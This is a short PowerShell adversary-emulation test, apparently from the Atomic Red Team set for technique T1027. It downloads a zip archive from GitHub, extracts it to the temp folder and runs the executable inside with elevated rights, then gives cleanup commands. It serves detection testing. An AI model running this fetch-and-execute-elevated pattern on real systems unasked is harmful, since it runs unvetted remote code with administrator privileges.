#Atomic Test #4 - Execution from Compressed File

if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {
    Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c ""%temp%\temp_T1027.zip\T1027.exe"'
    exit 0
}else{
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip" -OutFile "$env:temp\T1027.zip"
    Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force

    Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c ""%temp%\temp_T1027.zip\T1027.exe"'
    exit 1}

# Cleanup Commands:
#  Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "taskkill /f /im calculator.exe >nul 2>nul"'
#  Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul"'
#  Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "del /Q "%temp%\T1027.zip" >nul 2>nul"'
